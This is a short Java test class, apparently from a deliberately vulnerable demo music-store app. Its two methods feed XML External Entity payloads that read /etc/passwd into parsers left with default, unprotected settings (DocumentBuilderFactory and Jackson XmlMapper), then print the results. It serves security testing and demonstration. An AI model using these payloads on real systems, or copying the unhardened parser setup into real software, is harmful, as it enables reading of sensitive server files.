package io.vertx.demo.musicstore.xxe;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;

/**
 *
 * @author breakthesec
 */
public class XXETest {

	protected void doAttack() throws IOException {

		try {
			String strXml = "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n"
					+ "<stockCheck><productId>&xxe;</productId></stockCheck>";
			InputStream xml = new ByteArrayInputStream(strXml.getBytes(Charset.forName("UTF-8")));

			DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
			DocumentBuilder builder = factory.newDocumentBuilder();
			InputSource is = new InputSource(xml);
			Document doc = builder.parse(is);
			Element element = doc.getDocumentElement();
			NodeList nodes = element.getChildNodes();
			System.out.println("<br/>Result:<br/>");
			System.out.println("---------------------<br/>");
			for (int i = 0; i < nodes.getLength(); i++) {
				System.out.println(nodes.item(i).getNodeName() + " : " + nodes.item(i).getFirstChild().getNodeValue().toString());
				System.out.println("<br/>");
			}
		}
		catch (ParserConfigurationException ex) {
			System.out.println(ex);
		}
		catch (SAXException e) {
			System.out.println(e);
		}

	}

	protected void doAttack2() throws JsonParseException, JsonMappingException, IOException {
		ObjectMapper xmlMapper = new XmlMapper();
		Foo foo = xmlMapper.readValue("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" + "<!DOCTYPE foo [  \n"
				+ "  <!ELEMENT foo ANY >\n" + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><Foo><test>&xxe;</test></Foo>", Foo.class);
		System.out.println("foo.getTest():::>" + foo.getTest());
	}

}